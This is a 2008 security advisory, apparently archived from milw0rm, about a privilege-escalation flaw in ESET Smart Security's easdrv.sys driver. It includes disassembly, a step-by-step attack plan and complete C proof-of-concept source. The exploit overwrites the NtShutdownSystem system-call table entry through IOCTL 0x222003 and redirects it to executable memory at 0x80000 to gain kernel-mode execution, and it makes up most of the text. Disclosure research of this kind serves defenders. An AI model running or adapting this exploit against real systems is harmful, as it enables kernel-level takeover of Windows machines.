@@ -1,0 +1,251 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+- - Orange Bat advisory -
+
+Name         	: ESET Smart Security 3.0.667.0
+Class        	: Privilage escalation
+Published   	: 2008-08-14
+Credit		: g_ (g_ # orange-bat # com)
+
+- - Details -
+
+File: easdrv.sys
+
+.text:00012B92 loc_12B92:                             
+.text:00012B92                 push    [ebp+InputBuf]
+.text:00012B95                 call    ds:off_1A200[eax]
+.text:00012B9B                 mov     ecx, [ebp+OutputBuffer]
+.text:00012B9E                 mov     [ecx], eax
+
+Although this piece of code is wrapped with exception handler, 
+input and output pointers are not checked with ProbeForRead/Write.
+This will cause BSOD when input/output will point to kernel mode
+memory (above 0x80000000). 
+
+This code can be reached by sending IoControlCode = 0x222003 to 
+device \\.\\easdrv (see POC). In order to exploit this, we need
+to take a look at 
+
+.text:00012B95                 call    ds:off_1A200[eax]
+
+off_1A200 is:
+
+.rdata:0001A200 off_1A200       dd offset HookNtClose
+.rdata:0001A204                 dd offset sub_12838
+.rdata:0001A208                 dd offset sub_12874
+.rdata:0001A20C                 dd offset sub_128A8
+.rdata:0001A210                 dd offset sub_128E4
+.rdata:0001A214                 dd offset sub_1290A
+.rdata:0001A218                 dd offset sub_1292C
+	.
+	.
+	.
+
+These are wrappers for hooked syscalls. First one is NtClose, so
+there aren't many possible values that this API returns in eax. 
+We will use:
+
+C0000008	STATUS_INVALID_HANDLE	An invalid HANDLE was specified.
+
+Because it's the simplest status to get. 
+
+Attack scenario:
+
+1. Get address of some rarely used syscall, like NtShutdownSystem.
+   I will refer to this address as X :p
+2. Send signal to easdrv, with output buffer = X-1. This will result
+   in overwriting two highest bytes with zeros and will damage 1 byte
+   at X-1 :p.
+3. Send signal with output buffer = X+2. This will set two lower bytes
+   to 0x0800.
+4. Allocate memory at 0x80000 and copy shellcode there
+5. Call NtShutdownSystem to jump to shellcode in r0 mode.
+
+See POC for details. There is no cleanup, you will get BSOD at address 
+0x80000 :).
+
+It's possible to get required addresses by downloading symbols for 
+given kernel build or use technique presented in [1]. In POC code this
+address is hardcoded.
+
+- - Proof of concept -
+
+http://www.orange-bat.com/adv/2008/poc.08.14.eset.rar
+
+Compile with mingw:
+
+gcc -o poc.exe poc.c -lntdll
+
+
+- - References -
+
+[1] - Exploiting Windows Device Drivers, Piotr Bania
+      http://www.piotrbania.com/all/articles/ewdd.pdf
+
+- - PGP -
+
+All advisories from Orange Bat are signed. You can find our public
+key here: http://www.orange-bat.com/g_.asc
+
+- - Disclaimer -
+
+This document and all the information it contains is provided "as is",
+without any warranty. Orange Bat is not responsible for the
+misuse of the information provided in this advisory. The advisory is
+provided for educational purposes only.
+
+Permission is hereby granted to redistribute this advisory, providing
+that no changes are made and that the copyright notices and
+disclaimers remain intact.
+
+
+(c) 2008 www.orange-bat.com 
+
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.9 (MingW32)
+
+iEYEARECAAYFAkimwoMACgkQIUHRVUfOLgXj5ACeNkg3GNU//dJRBZFvo/PpRr1C
+EZYAoJXU4zaonv7a4pOQi7qoINDaE7vV
+=7B2G
+-----END PGP SIGNATURE-----
+
+//
+// ESET SmartSecurity priv. escalation
+//
+// visit www.orange-bat.com for full advisory
+//
+// g_
+// g_ # orange-bat # com
+
+#include <windows.h>
+#include <stdio.h>
+#include <ddk/ntifs.h>
+
+
+void TextError(LPTSTR lpszFunction)
+{
+    // Retrieve the system error message for the last-error code
+
+    LPVOID lpMsgBuf;
+    LPVOID lpDisplayBuf;
+    DWORD dw = GetLastError();
+
+    FormatMessage(
+        FORMAT_MESSAGE_ALLOCATE_BUFFER |
+        FORMAT_MESSAGE_FROM_SYSTEM |
+        FORMAT_MESSAGE_IGNORE_INSERTS,
+        NULL,
+        dw,
+        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+        (LPTSTR) &lpMsgBuf,
+        0, NULL );
+
+    // Display the error message and exit the process
+
+    lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
+        (lstrlen((LPCTSTR)lpMsgBuf)+lstrlen((LPCTSTR)lpszFunction)+40)*sizeof(TCHAR));
+    sprintf((LPTSTR)lpDisplayBuf,
+        TEXT("%s failed with error %d: %s"),
+        lpszFunction, dw, lpMsgBuf);
+    //MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);
+
+    printf(lpDisplayBuf);
+
+    LocalFree(lpMsgBuf);
+    LocalFree(lpDisplayBuf);
+}
+
+
+BOOL TestIOCTL(PCHAR DeviceName, DWORD Ioctl, DWORD InputBuffer, DWORD InputLen, DWORD OutputBuffer, DWORD OutputLen )
+{
+  HANDLE hDevice;               // handle to the drive to be examined
+  BOOL bResult;                 // results flag
+  DWORD junk;                   // discard results
+  IO_STATUS_BLOCK  IoStatusBlock;
+
+  hDevice = CreateFile(DeviceName,
+                    0,                // no access to the drive
+                    FILE_SHARE_READ | // share mode
+                    FILE_SHARE_WRITE,
+                    NULL,             // default security attributes
+                    OPEN_EXISTING,    // disposition
+                    0,                // file attributes
+                    NULL);            // do not copy file attributes
+
+  if (hDevice == INVALID_HANDLE_VALUE) // cannot open the drive
+  {
+	TextError("CreateFile");
+    return (FALSE);
+  }
+
+
+  bResult = DeviceIoControl(hDevice,  // device to be queried
+      						Ioctl,
+                            (PVOID)InputBuffer,
+                            InputLen,
+                            (PVOID)OutputBuffer,
+                            OutputLen,     // output buffer
+                            &junk,                 // # bytes returned
+                            (LPOVERLAPPED)NULL);  // synchronous I/O
+
+
+  if(!bResult){
+	  TextError("DeviceIoControl");
+  }
+
+  CloseHandle(hDevice);
+
+  return TRUE;
+}
+
+int AllocMem(DWORD lpBase){
+
+	PVOID lpvResult;
+
+  	lpvResult = VirtualAlloc(
+                     (LPVOID) lpBase, // Next page to commit
+                     0x1337,         // Page size, in bytes
+                     MEM_COMMIT,         // Allocate a committed page
+                     PAGE_EXECUTE_READWRITE);    // Read/write access
+  	if (lpvResult == NULL ){
+      TextError("VirtualAlloc");
+      return 0;
+    }
+    else {
+	  printf("VirtualAlloc success\n");
+    }
+
+	return 1;
+}
+
+int main(int argc, char *argv[])
+{
+	DWORD Ioctl, Input, ILen, Output, OLen;
+	DWORD SSDT;
+
+	if(!AllocMem(0x80000)){
+		return 1;
+	}
+
+	Input = 12345678;
+	SSDT = 0x80501414; //80501414  8060786e nt!NtShutdownSystem
+
+	Output = 0;
+	if(TestIOCTL("\\\\.\\easdrv", 0x222003, &Input, 4, SSDT-1, 4)){
+		TestIOCTL("\\\\.\\easdrv", 0x222003, &Input, 4, SSDT+2, 4);
+
+		printf("NtShutdownSystem now points to 0x80000 :)");
+		printf("Jump to hyperspace in 2 seconds..");
+		Sleep(2*1000);
+		NtShutdownSystem(0);
+	}
+	else{
+		printf("Failed to open device");
+	}
+
+  	return 0;
+}
+
+# milw0rm.com [2008-08-16]
